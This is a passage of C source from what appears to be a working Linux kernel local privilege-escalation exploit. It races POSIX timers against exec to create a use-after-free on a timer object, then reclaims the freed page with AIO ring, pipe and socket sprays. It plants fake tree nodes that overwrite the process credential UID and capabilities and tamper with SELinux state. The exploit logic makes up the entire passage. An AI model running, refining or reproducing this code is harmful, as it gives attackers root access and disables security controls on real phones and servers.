	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(g_child_cpu))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	int made = 0;
	dprintf(STDOUT_FILENO, "[exec] timers begin pid=%d tid=%d\n",
		(int)getpid(), (int)syscall(SYS_gettid));
	for (int i = 0; i < g_timer_count; i++) {
		timer_t extra;
		if (timer_create(thread_clock(i % 3), &armed_event, &extra)) {
			dprintf(STDOUT_FILENO,
				"[exec] timer_create fail i=%d errno=%d\n", i, errno);
			_exit(120);
		}
		/* BRM arms the signal timer at creation time, before the killer
		 * can reap the exec thread.  Arming after phase 4 races with the
		 * killer and leaves arm_idx=-1 on g928.  Arm every timer: the
		 * captured timer index is not guaranteed to match trace order. */
		if (timer_settime(extra, 0, &spec, NULL)) {
			dprintf(STDOUT_FILENO,
				"[exec] timer_settime fail i=%d errno=%d\n", i, errno);
			_exit(120);
		}
		g_tids[i] = extra;
		made++;
	}
	dprintf(STDOUT_FILENO, "[exec] timers made=%d armed=%d\n", made, made);
	if (made < g_timer_count)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(g_child_cpu))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

static int line_has_pfn(const char *line, uint64_t pfn)
{
	char exact[40];
	char *hit;
	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
	if (n <= 0)
		return 0;
	hit = strstr(line, exact);
	if (!hit)
		return 0;
	{
		char end = hit[n];
		if ((end >= '0' && end <= '9') ||
		    (end >= 'a' && end <= 'f') ||
		    (end >= 'A' && end <= 'F'))
			return 0;
	}
	return 1;
}

static int raw_has_ptr(uint64_t ptr)
{
	uint8_t needle[8];
	int cpu;
	memcpy(needle, &ptr, 8);
	for (cpu = 0; cpu < 8; cpu++) {
		char path[128];
		uint8_t *buf = malloc(8U << 20);
		size_t used = 0;
		int fd;
		if (!buf)
			return -1;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			alarm(2);
			while (used + 4096 < (8U << 20)) {
				ssize_t n = read(fd, buf + used, (8U << 20) - used);
				if (n < 0) {
					if (errno == EINTR)
						break;
					break;
				}
				if (n == 0)
					break;
				used += (size_t)n;
			}
			alarm(0);
			close(fd);
		}
		dprintf(STDOUT_FILENO, "[freeobj] cpu%d raw_bytes=%zu\n", cpu, used);
		for (size_t i = 0; i + 8 <= used; i++) {
			if (!memcmp(buf + i, needle, 8)) {
				free(buf);
				dprintf(STDOUT_FILENO, "[freeobj] ptr on cpu%d raw_bytes=%zu\n",
					cpu, used);
				return 1;
			}
		}
		free(buf);
	}
	return 0;
}

static int flush_timers(void)
{
	struct sigevent event;
	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
	int created = 0;
	if (!ids)
		return -1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < NFLUSH; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		created++;
	}
	for (int i = 0; i < created; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[flush] deleted=%d\n", created);
	return created >= 256 ? 0 : -1;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];
static int g_cpu_lines[MAX_CPU];
static int g_hit_cpu = -1;
static int g_hit_index = -1;

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static void *spray_cpu(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	struct timespec pause = { .tv_nsec = 400000000 };
	if (pin_cpu(cpu))
		return NULL;
	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
	       g_cpu_n[cpu] < PER_CPU_RINGS) {
		int batch = 0;
		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
			uint64_t ctx = 0;
			if (syscall(SYS_io_setup, 1, &ctx)) {
				dprintf(STDOUT_FILENO, "[aio] cpu%d stop errno=%d n=%d\n",
					cpu, errno, g_cpu_n[cpu]);
				return NULL;
			}
			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
			batch++;
		}
		if (!batch)
			break;
		nanosleep(&pause, NULL);
	}
	return NULL;
}

static int reclaim_and_plant(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	pthread_t threads[MAX_CPU];
	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
	int shown = 0, victim_frees = 0;
	uint64_t victim_base;
	if (node_off + 24 > 4096) {
		dprintf(STDOUT_FILENO, "[plant] node crosses a page off=%#x\n", node_off);
		return -1;
	}
	build_watch();
	victim_base = node_pfn & ~UINT64_C(1);
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[aio] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
		ncpu, g_nwatch, node_pfn);
	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
		return -1;
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	for (int cpu = 0; cpu < ncpu; cpu++) {
		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
			ncpu = cpu;
	}
	for (int cpu = 0; cpu < ncpu; cpu++)
		pthread_join(threads[cpu], NULL);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		int lines = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		seek_trace_tail(file);
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
				      strstr(line, "uaf_plant");
			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
				free_hits++;
				if (pfn == victim_base || pfn == node_pfn)
					victim_frees++;
				if (shown < 4) {
					dprintf(STDOUT_FILENO, "[free] %s", line);
					shown++;
				}
			}
			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
				alloc_hits++;
				if (shown < 10) {
					dprintf(STDOUT_FILENO, "[alloc] %s", line);
					shown++;
				}
			}
			if (!filemap)
				continue;
			if (g_hit_index < 0 && pfn == node_pfn) {
				g_hit_cpu = cpu;
				g_hit_index = lines;
			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
				other++;
			lines++;
		}
		fclose(file);
		g_cpu_lines[cpu] = lines;
		rings += g_cpu_n[cpu];
		dprintf(STDOUT_FILENO, "[aio] cpu%d rings=%d filemap=%d\n",
			cpu, g_cpu_n[cpu], lines);
	}
	g_nrings = rings;
	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
	    g_hit_index < g_cpu_n[g_hit_cpu]) {
		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
		uint64_t *node;
		if (ring[4] != UINT32_C(0xa10a10a1)) {
			dprintf(STDOUT_FILENO, "[aio] bad magic %#x\n", ring[4]);
			return -1;
		}
		node = (uint64_t *)((char *)ring + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
		__sync_synchronize();
		dprintf(STDOUT_FILENO,
			"[plant] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
		quiet_reclaim_trace();
		return 0;
	}
	/* The filemap event is not emitted for AIO ring pages on 6.12, so the
	 * pfn->ring lookup above cannot identify the owner. Plant the fake node
	 * into every mapped AIO ring instead: if the target page is any of them,
	 * the later rb_erase sees our node. */
	{
		int planted = 0;
		for (int cpu = 0; cpu < ncpu; cpu++) {
			for (int i = 0; i < g_cpu_n[cpu]; i++) {
				uint32_t *ring =
					(uint32_t *)(uintptr_t)g_cpu_ctx[cpu][i];
				uint64_t *node;
				if (ring[4] != UINT32_C(0xa10a10a1))
					continue;
				node = (uint64_t *)((char *)ring + node_off);
				node[0] = 0;
				node[1] = 0;
				node[2] = target;
				planted++;
			}
		}
		dprintf(STDOUT_FILENO,
			"[aio] plant-all rings=%d planted=%d off=%#x target=%#" PRIx64 "\n",
			rings, planted, node_off, target);
		if (planted) {
			quiet_reclaim_trace();
			return 0;
		}
	}
	dprintf(STDOUT_FILENO,
		"[aio] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
		rings, other, free_hits, alloc_hits, victim_frees);
	quiet_reclaim_trace();
	return -1;
}

static unsigned long *g_hold;
static int g_nhold;
static pid_t g_holders[4];

static int hold_aio_children(void)
{
	int ready[2];
	if (pipe(ready))
		return -1;
	for (int i = 0; i < 4; i++) {
		pid_t pid = fork();
		if (pid < 0)
			return -1;
		if (pid == 0) {
			int n = 0;
			close(ready[0]);
			while (n < 20000) {
				unsigned long ctx = 0;
				if (syscall(SYS_io_setup, 1, &ctx))
					break;
				n++;
			}
			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
				i, n, errno);
			if (write(ready[1], "x", 1) != 1)
				_exit(1);
			for (;;)
				pause();
		}
		g_holders[i] = pid;
	}
	close(ready[1]);
	for (int i = 0; i < 4; i++) {
		char bit;
		if (read(ready[0], &bit, 1) != 1)
			return -1;
	}
	close(ready[0]);
	return 0;
}
static int g_nhold;

static int drain_aio(void)
{
	g_hold = calloc(70000, sizeof(*g_hold));
	g_nhold = 0;
	if (!g_hold)
		return -1;
	while (g_nhold < 70000) {
		unsigned long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx))
			break;
		g_hold[g_nhold++] = ctx;
	}
	dprintf(STDOUT_FILENO, "[aio-hold] rings=%d errno=%d\n", g_nhold, errno);
	return g_nhold > 1000 ? 0 : -1;
}

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_catch[1024][2];
static int g_ncatch;

static int prepare_catch(void)
{
	g_ncatch = 0;
	for (int i = 0; i < 1024; i++) {
		if (pipe(g_catch[i]))
			break;
		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_catch[i][0]);
			close(g_catch[i][1]);
			break;
		}
		g_ncatch++;
	}
	dprintf(STDOUT_FILENO, "[pipe] empty=%d\n", g_ncatch);
	return g_ncatch >= 128 ? 0 : -1;
}

static int reclaim_pipe(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	uint64_t victim_base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	unsigned char *page;
	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
	if (node_off + 24 > 4096)
		return -1;
	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		return -1;
	memset(page, 0, 4096);
	{
		uint64_t *node = (uint64_t *)(page + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[pipe] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < g_ncatch; i++) {
		int done = 0;
		if ((i % 32) == 0) {
			struct timespec pause = { .tv_nsec = 100000000 };
			pin_cpu((i / 32) % ncpu);
			if (i)
				nanosleep(&pause, NULL);
		}
		while (done < 4096) {
			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
			if (n < 0)
				break;
			done += (int)n;
		}
		if (done == 4096)
			wrote_pages++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		seek_trace_tail(file);
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			if (pfn == UINT64_MAX || !watch_has(pfn))
				continue;
			if (strstr(line, "mm_page_free:"))
				free_hits++;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			if (pfn != node_pfn && pfn != victim_base)
				continue;
			if (strstr(line, "order=0"))
				order0++;
			if (strstr(line, "order=1"))
				order1++;
			dprintf(STDOUT_FILENO, "[pipe-alloc] %s", line);
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[pipe] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
		wrote_pages, free_hits, order0, order1);
	quiet_reclaim_trace();
	munmap(page, 4096);
	return order0 > 0 ? 0 : -1;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

static int env_int(const char *name, int def, int lo, int hi)
{
	const char *v = getenv(name);
	int n = v ? atoi(v) : def;
	if (n < lo)
		n = lo;
	if (n > hi)
		n = hi;
	return n;
}

/* Create/free timers on every present CPU to force SLUB to return the
 * victim's now-empty order-1 slab. This is the 6.12/Honor replacement for
 * the 6.18 free_slab trace assumption: the empty slab can stay on a CPU
 * partial list indefinitely, so a plain free_slab wait never observes it. */
static int timer_churn(uint64_t base, uint64_t want_half,
		       struct page_free_info *out)
{
	int rounds = env_int("PC98260_CHURN_ROUNDS", 16, 1, 64);
	int per_cpu = env_int("PC98260_CHURN_PER_CPU", 128, 1, 512);
	int ncpu = cpu_count();
	timer_t ids[512];
	struct timespec pause = { .tv_nsec = 20000000 };
	int total = 0;

	memset(out, 0, sizeof(*out));
	for (int r = 0; r < rounds; r++) {
		for (int cpu = 0; cpu < ncpu; cpu++) {
			int made = 0;
			pin_cpu(cpu);
			for (int i = 0; i < per_cpu; i++) {
				struct sigevent ev;
				memset(&ev, 0, sizeof(ev));
				ev.sigev_notify = SIGEV_NONE;
				if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &ids[made]))
					break;
				made++;
			}
			for (int i = 0; i < made; i++)
				timer_delete(ids[i]);
			total += made;
			if (find_page_free(base, want_half, out)) {
				dprintf(STDOUT_FILENO,
					"[churn] hit round=%d cpu=%d pfn=%#" PRIx64 " order=%d total=%d\n",
					r, cpu, out->pfn, out->order, total);
				pin_cpu(0);
				return 1;
			}
			nanosleep(&pause, NULL);
		}
		if ((r % 4) == 3)
			dprintf(STDOUT_FILENO, "[churn] round=%d total=%d\n", r, total);
	}
	pin_cpu(0);
	return 0;
}

static void victim_cpu_churn(int cpu)
{
	int want = 4096, made = 0;
	timer_t *ids = malloc(sizeof(*ids) * (size_t)want);
	struct sigevent ev;
	if (!ids)
		return;
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	pin_cpu(cpu);
	for (int i = 0; i < want; i++) {
		if (timer_create(CLOCK_MONOTONIC, &ev, &ids[i]))
			break;
		made++;
	}
	for (int i = 0; i < made; i++)
		timer_delete(ids[i]);
	free(ids);
	pin_cpu(0);
	dprintf(STDOUT_FILENO, "[reclaim-churn] n=%d made=%d cpu=%d\n",
		want, made, cpu);
}

/* Reclaim only the 4K half that contains the stale node. pat is the 8 KiB
 * replacement page; slice points at the half that was actually released. */
static int reclaim_stream_half(const unsigned char *slice, size_t len,
			       uint64_t free_pfn, int free_cpu)
{
	struct timespec pause = { .tv_nsec = 50000000 };
	int wrote = 0;

	if (free_cpu >= 0)
		(void)pin_cpu(free_cpu);
	dprintf(STDOUT_FILENO,
		"[half] free_pfn=%#" PRIx64 " cpu=%d len=%zu\n",
		free_pfn, free_cpu, len);
	for (int round = 0; round < 6; round++) {
		for (int i = 0, sock = 0; i < 80; i++) {
			ssize_t n = write(g_stream[sock][0], slice, len);
			if (n == (ssize_t)len)
				wrote++;
			else if (++sock >= g_nstream)
				break;
		}
		if (find_page_alloc(free_pfn)) {
			dprintf(STDOUT_FILENO,
				"[half] hit pfn=%#" PRIx64 " writes=%d\n",
				free_pfn, wrote);
			return 0;
		}
		nanosleep(&pause, NULL);
	}
	dprintf(STDOUT_FILENO, "[half] miss pfn=%#" PRIx64 " writes=%d\n",
		free_pfn, wrote);
	return -1;
}

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t offset_base = object_pfn_offset(victim + KITIMER_NODE) & ~UINT64_C(1);
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	g_alt_pfn = offset_base;
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	struct page_free_info pf;
	int free_cpu = -1;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	if (g_plant_cred && g_tiles_on) {
		uint64_t page = PAGE_OFFSET + (offset_base << 12);
		for (int b = 0; b < 3; b++) {
			unsigned off = g_tile_off[b];
			uint64_t *node = (uint64_t *)(pat + off);
			int kind = g_tile_kind[b];
			if (off + 24 > 8192) {
				dprintf(STDOUT_FILENO, "[cred] tile %d off=%#x\n", b, off);
				munmap(pat, 8192);
				return -1;
			}
			if (kind == TILE_CRED) {
				node[0] = 0; node[1] = 0;
				node[2] = g_cred_kva + GEO_CRED_UID;
				dprintf(STDOUT_FILENO, "[tile] CRED off=%#x zero=%#" PRIx64 "\n", off, node[2]);
			} else if (kind == TILE_SELINUX) {
				node[0] = 0; node[1] = 0;
				node[2] = slide_addr(SELINUX_LINK) - 7;
				dprintf(STDOUT_FILENO, "[tile] SELINUX off=%#x zero=%#" PRIx64 "\n", off, node[2]);
			} else if (kind == TILE_CRED2) {
				uint64_t A = page + off;
				node[0] = A; node[1] = 0;
				node[2] = g_cred_kva + GEO_CRED_CAP_EFF;
				dprintf(STDOUT_FILENO, "[tile] CRED2 off=%#x A=%#" PRIx64 " bit16=%d cap=%#" PRIx64 "\n",
					off, A, (int)((A >> 16) & 1), node[2]);
			}
		}
	} else if (g_plant_cred) {
		uint64_t *node = (uint64_t *)(pat + node_off);
		if (node_off + 24 > 8192) {
			munmap(pat, 8192);
			return -1;
		}
		node[0] = 0; node[1] = 0;
		node[2] = g_cred_kva + GEO_CRED_UID;
		dprintf(STDOUT_FILENO, "[cred] zero-write real cred+8 target=%#" PRIx64 " off=%#x\n",
			g_cred_kva + GEO_CRED_UID, node_off);
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream] tile align=%u off=%#x\n", align, node_off);
	}
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	if (!g_nstream) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	/* 16000 timer frees produce several MB of trace text.  A small ring
	 * evicts the victim's mm_page_free before the scan reaches it. */
	{
		char bs[32];
		const char *env = getenv("PC98260_STREAM_BUF_KB");
		snprintf(bs, sizeof(bs), "%d\n", env ? atoi(env) : 65536);
		if (write_file(TRACE "/buffer_size_kb", bs)) {
			close_stream();
			return -1;
		}
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	{
		/* The page normally returns within a few hundred ms of the kill;
		   waiting 8 s on a miss just burns the retry budget. */
		struct timespec pause = { .tv_nsec = 200000000 };
		struct timespec w0, w1;
		int freed = 0;
		int iters = 0;
		long cap_ms;
		struct timespec now;
		{
			const char *env = getenv("PC98260_WAIT_CAP_S");
			int secs = env ? atoi(env) : 60;
			cap_ms = (long)(secs > 0 ? secs : 60) * 1000;
		}
		memset(&pf, 0, sizeof(pf));
		/* Fast path: the page often returns immediately after the reap.  Check
		 * the trace tail before churn floods the ring. */
		freed = find_page_free(base, node_pfn, &pf);
		/* BRM order: wait quietly first.  Churn itself produces slab page
		 * frees and can overwrite the target event in the ring. */
		if (!freed) {
			struct timespec quiet0, quiet1;
			int churn = 1;
			const char *churn_env = getenv("PC98260_RECLAIM_CHURN");
			if (churn_env && atoi(churn_env) == 0)
				churn = 0;
			clock_gettime(CLOCK_MONOTONIC, &quiet0);
			for (int i = 0; i < 10 && !freed; i++) {
				nanosleep(&pause, NULL);
				/* BRM g186/6.18 does not churn here.  Churn allocates
				 * fresh slabs and can steal the page that just returned,
				 * turning a recoverable miss into page_freed=0. */
				if (churn && g_victim_cpu >= 0 && (i == 3 || i == 6))
					victim_cpu_churn(g_victim_cpu);
				freed = find_page_free(base, node_pfn, &pf);
			}
			clock_gettime(CLOCK_MONOTONIC, &quiet1);
			dprintf(STDOUT_FILENO,
				"[stream] quiet_wait_freed=%d churn=%d ms=%ld\n",
				freed, churn,
				(long)((quiet1.tv_sec - quiet0.tv_sec) * 1000 +
				       (quiet1.tv_nsec - quiet0.tv_nsec) / 1000000));
		}
		/* BRM g186/6.18 has no churn: if the page is not free within the quiet
		 * window, go straight to the stream spray and watch mm_page_alloc. */
		dprintf(STDOUT_FILENO, "[stream] churn_cpu=%d\n", g_victim_cpu);
		/* 进度可见：万一再卡，日志能直接指出卡在"等 page_freed"里。 */
		dprintf(STDOUT_FILENO,
			"[stream] waiting page_freed pfn=%#" PRIx64 " (cap %ld ms)\n",
			base, cap_ms);
		clock_gettime(CLOCK_MONOTONIC, &w0);
		for (int i = 0; i < 1200 && !freed; i++) {
			nanosleep(&pause, NULL);
			freed = find_page_free(base, node_pfn, &pf);
			iters = i + 1;
			clock_gettime(CLOCK_MONOTONIC, &now);
			/* 墙钟上界：将来内核改动让命中变难时，这里保证只是"多花
			 * 一次重试"，而不是退化成无界等待。 */
			if (!freed &&
			    (long)((now.tv_sec - w0.tv_sec) * 1000 +
				   (now.tv_nsec - w0.tv_nsec) / 1000000) >= cap_ms) {
				dprintf(STDOUT_FILENO,
					"[stream] wait cap %ld ms hit at iter %d, "
					"treating as miss\n", cap_ms, iters);
				break;
			}
		}
		clock_gettime(CLOCK_MONOTONIC, &w1);
		dprintf(STDOUT_FILENO,
			"[stream] page_freed=%d pfn=%#" PRIx64 " order=%d cpu=%d (%ld ms, %d iter)\n",
			freed, pf.pfn, pf.order, pf.cpu,
			(long)((w1.tv_sec - w0.tv_sec) * 1000 +
			       (w1.tv_nsec - w0.tv_nsec) / 1000000),
			iters);
		if (freed && pf.order == 0) {
			uint64_t alt_node = (g_alt_pfn != UINT64_MAX && node_pfn >= base)
				? g_alt_pfn + (node_pfn - base) : UINT64_MAX;
			if (pf.pfn != node_pfn && pf.pfn != alt_node) {
				dprintf(STDOUT_FILENO,
					"[half] wrong half pfn=%#" PRIx64 " node_pfn=%#" PRIx64 "\n",
					pf.pfn, node_pfn);
				quiet_reclaim_trace();
				munmap(pat, 8192);
				close_stream();
				return -1;
			}
			size_t half = (pf.pfn == base || pf.pfn == g_alt_pfn) ? 0 : 4096;
			if (reclaim_stream_half(pat + half, 4096, pf.pfn, pf.cpu) == 0) {
				write_file(TRACE "/tracing_on", "0\n");
				quiet_reclaim_trace();
				munmap(pat, 8192);
				return 0;
			}
			quiet_reclaim_trace();
			munmap(pat, 8192);
			close_stream();
			return -1;
		}
		if (freed)
			free_cpu = pf.cpu;
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	long frag_target = 6000;
	{
		const char *env = getenv("PC98260_STREAM_FRAGS");
		if (env) {
			long v = atol(env);
			if (v >= 512 && v <= 8192)
				frag_target = v;
		}
	}
	dprintf(STDOUT_FILENO, "[stream] frag_target=%ld\n", frag_target);
	while (!hit && writes < frag_target) {
		int progressed = 0;
		for (int sock = 0; sock < g_nstream && writes < frag_target; sock++) {
			pin_cpu(free_cpu >= 0 ? free_cpu : (sock % ncpu));
			for (int burst = 0; burst < 256; burst++) {
				ssize_t n = write(g_stream[sock][0], pat, 8192);
				if (n == 8192) {
					writes++;
					progressed = 1;
				} else {
					break;
				}
			}
		}
		hit = find_page_alloc(base);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (!progressed || now.tv_sec - start.tv_sec > 8)
			break;
	}
	if (!hit && free_cpu >= 0) {
		size_t half = (node_off & 0x1000) ? 4096 : 0;
		dprintf(STDOUT_FILENO,
			"[stream] 8K miss; retry 4K half=%zu pfn=%#" PRIx64 "\n",
			half / 4096, node_pfn);
		if (reclaim_stream_half(pat + half, 4096, node_pfn,
					free_cpu) == 0)
			hit = 1;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream] hit pfn=%#" PRIx64 "\n", base);
	dprintf(STDOUT_FILENO, "[stream] writes=%d hit=%d\n", writes, hit);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int g_dgram[2] = { -1, -1 };

static int reclaim_dgram(uint64_t victim, uint64_t target)
{
